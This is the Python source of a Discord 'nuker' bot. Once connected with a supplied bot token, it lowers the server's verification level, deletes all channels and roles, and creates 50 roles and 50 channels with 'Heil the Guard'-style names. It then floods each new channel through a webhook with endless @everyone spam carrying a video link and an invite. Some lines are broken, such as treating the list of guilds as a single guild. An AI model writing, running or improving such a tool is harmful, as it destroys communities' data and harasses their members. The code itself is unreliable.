import asyncio
import aiohttp
import random
import discord.ext
import requests as rq_
from colorama import Fore
from discord.ext import commands

prefix = '>'
intents = discord.Intents.all()
TOKEN = input("Token:")
headers = {'Authorization': f'Bot {TOKEN}'}
chNames = ['heil hmg', 'heil hmg', 'heil hmg', 'heil hmg']
rNames = ['Nuked By Jak | Heil the Guard', 'Nuked By Jak | Heil the Guard']
SPAM = "@everyone https://cdn.discordapp.com/attachments/1086450936295194625/1096192512554713138/lv_0_20230411200517.mp4  https://discord.gg/rdXHweYQ7f"
rq = rq_.Session()

Sachs = commands.Bot(command_prefix=prefix, intents=intents, case_insensitive=True)


### Functions ###
async def deleteChannel(channel, session):
    while True:
        async with session.delete(f"https://discord.com/api/v9/channels/{channel}", headers=headers) as channelDel:
            if channelDel.status == 429:
                response = await channelDel.json()
                await asyncio.sleep(response['retry_after'])
            else:
                break


async def createChannel(guild, session):
    json = {"name": random.choice(chNames)}
    while True:
        async with session.post(f"https://discord.com/api/v9/guilds/{guild}/channels", headers=headers,
                                json=json) as channelCre:
            if channelCre.status == 429:
                response = await channelCre.json()
                await asyncio.sleep(response['retry_after'])
            else:
                break


async def createRole(guild, session):
    json = {"name": random.choice(rNames), "color": "0x4a412a"}
    while True:
        async with session.post(f"https://discord.com/api/v9/guilds/{guild}/roles", headers=headers,
                                json=json) as roleCre:
            if roleCre.status == 429:
                response = await roleCre.json()
                await asyncio.sleep(response['retry_after'])
            else:
                break


async def deleteRole(guild, role, session):
    while True:
        async with session.delete(f"https://discord.com/api/v9/guilds/{guild}/roles/{role}",
                                  headers=headers) as roleDel:
            if roleDel.status == 429:
                response = await roleDel.json()
                await asyncio.sleep(response['retry_after'])
            else:
                break


### Bot Events ###
@Sachs.event
async def on_ready():
    print(f"{Fore.RED}Ready to cause Mayhem{Fore.RESET}")


@Sachs.event
async def on_guild_channel_create(channel):
    webhook = await channel.create_webhook(name="HEIL THE GUARD")
    while True:
        await webhook.send(SPAM)


### Bot Commands ###
"""
@Sachs.command()
async def cdel(ctx):
    channels = []

    for channel in ctx.guild.channels:
        channels.append(channel.id)

    async with aiohttp.ClientSession() as session:
        tasks = []

        for channel in channels:
            tasks.append(asyncio.create_task(deleteChannel(channel, session)))
"""


@Sachs.event
async def on_connect():
    guild = Sachs.guilds
    await guild.edit(default_notifications=None, verification_level=discord.VerificationLevel.none())

    channels = []
    roles = []

    for channel in guild.channels:
        channels.append(channel.id)
    for role in guild.roles:
        roles.append(role.id)

    async with aiohttp.ClientSession() as session:
        tasks = []

        for channel in channels:
            tasks.append(asyncio.create_task(deleteChannel(channel, session)))
        await asyncio.gather(*tasks)

        for role in roles:
            tasks.append(asyncio.create_task(deleteRole(guild.id, role, session)))
        await asyncio.gather(*tasks)

        for i in range(50):
            tasks.append(asyncio.create_task(createRole(guild.id, session)))
        await asyncio.gather(*tasks)

        for i in range(50):
            tasks.append(asyncio.create_task(createChannel(guild.id, session)))
        await asyncio.gather(*tasks)

    """  
    async with aiohttp.ClientSession() as session:
      tasks = []
      for i in range(50):
        tasks.append(asyncio.create_task(createChannel(guild.id, session)))
      await asyncio.gather(*tasks)
    """

Sachs.run(TOKEN)
